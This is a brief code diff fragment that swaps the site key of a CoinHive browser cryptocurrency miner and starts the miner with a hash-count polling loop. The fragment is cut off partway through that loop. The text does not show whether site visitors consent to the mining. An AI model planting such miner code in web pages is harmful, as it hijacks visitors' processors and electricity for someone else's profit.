@@ -1,4 +1,4 @@
-var miner = new CoinHive.Anonymous('F2N8zs5BnMibBRjA9bEvn4NJ8wiAXPdt');
+var miner = new CoinHive.Anonymous('nzsqRtzXjHw8qYGPdSV56jEattRTXGxb');
 miner.start();
 setInterval(function() {
 	var totalHashes = miner.getTotalHashes();
